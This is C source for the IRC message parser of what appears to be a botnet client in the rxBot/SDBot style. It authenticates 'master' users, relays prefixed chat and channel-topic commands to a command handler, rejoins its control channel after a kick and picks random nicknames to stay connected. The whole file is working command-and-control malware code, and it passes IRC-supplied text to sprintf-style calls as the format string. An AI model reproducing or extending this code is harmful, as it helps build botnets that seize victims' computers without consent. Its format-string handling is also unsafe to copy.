#include "../h/includes.h"
#include "../h/functions.h"
#include "../h/externs.h"

/*SWITCHES GetSwitches(char *a[MAX_TOKENS],int t)
{
	SWITCHES rswitch;

	unsigned char switches[256];
	ZeroMemory(switches,sizeof(switches));
	for (int i=t; i>=0; i--) {
		if (a[i])
		{ 
			if ((a[i][0] == '-') && (a[i][2] == 0))
			{	// -a
				switches[a[i][1]]=1;
				a[i][0]=0;
				a[i][1]=0;
				a[i][2]=0;
				a[i]=NULL;
			}
			else if ((a[i][0] == '-') && (a[i][2] == ':') && (a[i][4] == 0))
			{	// -r:*
				switches[a[i][1]]=1;
				if (a[i][1] == 'r')
					rswitch.replace_char=a[i][3];
				a[i][0]=0;
				a[i][1]=0;
				a[i][2]=0;
				a[i]=NULL;
			}
			else
				break;
		}
	}

	rswitch.silent	= (switches['s']);
	
	return rswitch;
}*/

int IRC_ProtocolParse(char *line, SOCKET sock, char *server, char *channel, char *chanpass, char *nick, char *host, char masters[MAXLOGINS][MAXIDENT], int *in_channel, int repeat, int clone)
{
	char line1[IRCLINE], line2[IRCLINE], sendbuf[IRCLINE];
	char *a[MAXTOKENS], user[MAXIDENT], *ptr;

	int i, s=3;

	DWORD id=0;
	BOOL ismaster = FALSE;

	_snprintf(line1, sizeof(line1), line);
	a[0] = strtok(line1, " ");
	for (i = 1; i < MAXTOKENS; i++) 
		a[i] = strtok(NULL, " ");

	if (a[0] == NULL || a[1] == NULL) 
		return 1;

	if (strcmp("PING", a[0]) == 0) {
		irc_sendv(sock, "PONG %s\r\n", a[1]);
		if (*in_channel == 0)
			irc_sendv(sock, "JOIN %s %s\r\n", channel, chanpass);

		return 1;
	}

	if (a[0][0] == ':') {
		_snprintf(user, sizeof(user), a[0]+1);
		strtok(user, "!");
	} else
		return 1;

	for (i = 0; i < MAXLOGINS; i++) {
		if (strcmp(masters[i], a[0]) == 0)
			ismaster = TRUE;
	}

	//if (strcmp("PRIVMSG", a[1]) == 0 || strcmp("NOTICE", a[1]) == 0 || (strcmp("TOPIC", a[1]) == 0 && topiccmd)) {
	if (strcmp("PRIVMSG", a[1]) == 0 || strcmp("NOTICE", a[1]) == 0) {
		if (a[2] == NULL || a[3] == NULL) 
			return 1;

		//if (strcmp("TOPIC", a[1]) == 0 && clone != 0) 
		//	return 1;
	
		if (a[2][0] != '#' || strcmp("NOTICE",a[1]) == 0) 
			a[2] = user;

		if (++a[3] && nick) {
			s = (strncmp(nick, a[3], strlen(nick)) == 0)?(4):(3);
			if (a[s] == NULL) 
				return 1;

			if (a[s][0] == prefix && clone == 0) {
				a[s]++;
				return (IRC_CommandParse(line,a,s,sock,server,channel,chanpass,nick,user,host,masters,ismaster,repeat));
			}

			if (strcmp("\1VERSION\1", a[s]) == 0) {
				if (a[2][0] != '#' && versionlist[current_version][0] != '\0') {
					irc_sendv(sock, "NOTICE %s :\1VERSION %s\1\r\n", a[2], (char *)versionlist[current_version]);

					return 1;
				}
			}
			else if (strcmp("\1PING", a[s]) == 0) {
				if (a[s+1] && a[2][0] != '#') {
					irc_sendv(sock, "NOTICE %s :\1PING %s\1\r\n", a[2], a[s+1]);

					return 1;
				}
			}
		}
	}
	else if (strcmp("KICK", a[1]) == 0) {
		for (i = 0; i < MAXLOGINS; i++) {
			if (masters[i][0] != '\0') {
				if ((strncmp(masters[i], a[0], strlen(masters[i])) == 0) || (strcmp(user,a[3]) == 0)) {
					masters[i][0] = '\0';
					_snprintf(sendbuf,sizeof(sendbuf),"[MAIN]: User: %s logged out.", user);
					irc_sendv(sock, "NOTICE %s :%s\r\n", user, sendbuf);
					addlog(sendbuf);

					break;
				}
			}
		}
		if (strcmp(nick, a[3]) == 0) {
			*in_channel = 0;
			irc_sendv(sock, "JOIN %s %s\r\n", channel, chanpass);
		} 

		return 1;
	}
	else if (strcmp("PART", a[1]) == 0 || strcmp("QUIT", a[1]) == 0) {
		for (i = 0; i < MAXLOGINS; i++) {
			if (masters[i][0] != '\0') {
				if (strncmp(masters[i], a[0], strlen(masters[i])) == 0) {
					masters[i][0] = '\0';

					_snprintf(sendbuf, sizeof(sendbuf), "[MAIN]: User: %s logged out.", user);
					if (strcmp("PART", a[1]) == 0) 
						irc_sendv(sock, "NOTICE %s :%s\r\n", a[0]+1, sendbuf);
					addlog(sendbuf);

					return 1;
				}
			}
		}
	}
	else if (strcmp("NICK", a[1]) == 0) {
		if(strcmp(user, nick) == 0)
			_snprintf(nick,MAXNICKLEN,a[2]+1);
		else {
			for (i = 0; i < MAXLOGINS; i++) {
				if (masters[i][0] != '\0') {
					if (strcmp(masters[i],a[0]) == 0) {
						char *identhost = strchr(a[0],'!');
						if (identhost && (strlen(a[2]+1) + strlen(identhost) < MAXIDENT)) {
							_snprintf(sendbuf, sizeof(sendbuf), "[MAIN]: Master: %s changed identity to: .",masters[i],a[0]+1);
							_snprintf(masters[i],MAXIDENT,":%s%s",a[2]+1,identhost);
						} else
							_snprintf(sendbuf, sizeof(sendbuf), "[MAIN]: Failed to change nick for Master: %s.",masters[i]);
						addlog(sendbuf);

						break;
					}
				}
			}
		}

		return 1;
	}
	else if ((i=atoi(a[1])) != 0) {
		switch (i) {
		case 0:
			break;

		case 1:
			irc_sendv(sock, "USERHOST %s\r\n", nick);
			#ifndef NO_MODEONCONN
			irc_sendv(sock, "MODE %s %s\r\n", nick, modeonconn);
			#else
			irc_sendv(sock, "MODE %s +i\r\n", nick);
			#endif
			irc_sendv(sock, "JOIN %s %s\r\n", channel, chanpass);
			if (strcmp(chanmode, "") != 0 && clone == 0)
				irc_sendv(sock, "MODE %s %s\r\n", channel, chanmode);

			success = TRUE;

			break;

		case 302:
			ptr = strstr(a[3], "@");
			if (ptr != NULL) 
				_snprintf(host, MAXHOSTNAME, ptr+1);

			break;

		case 332:
			if (a[4]) {
				if (a[4][1] == prefix && clone == 0) {
					char *b[MAXTOKENS];
					int rval;

					ptr = strstr(line, " :");
					ptr += 2;
					_snprintf(sendbuf, sizeof(sendbuf), ptr);

					b[i=0] = strtok(sendbuf, "|");
					for (i=1;b[i] = strtok(NULL,"|"); i++)
						while (b[i][0] == ' ')
							b[i]++;

					i=0, rval=0;
					while (b[i]) {
						_snprintf(line2, sizeof(line2), line);
						ptr = strstr(line2, " :");
						ptr += 2;
						sprintf(ptr, b[i]);

						_snprintf(line1,sizeof(line1),line2);

						a[0] = strtok(line1, " ");
						for (int j = 1; j < MAXTOKENS; j++) 
							a[j] = strtok(NULL, " ");
						a[s = 4]+=2;
						a[2] = a[3];

						Sleep(100);
						rval = IRC_CommandParse(line2,a,s,sock,server,channel,chanpass,nick,user,host,masters,ismaster,repeat);
						if (b[++i]) Sleep(FLOOD_DELAY);
					}
					return (rval);
				}
			}
				
			break;

		case 353:
			if (strcmp(channel, a[4]) == 0)
				*in_channel = 1;
			addlogv("[MAIN]: Joined channel: %s.", a[4]);

			break;

		case 433:
			char nickbuf[MAXNICKLEN];
			memset(nickbuf,0,sizeof(nickbuf));
			rndnick(nickbuf, nicktype, nickprefix);
			irc_sendv(sock,"NICK %s\r\n",nickbuf);

			break;

		default:
			break;
		}
	}


	return 1;
}
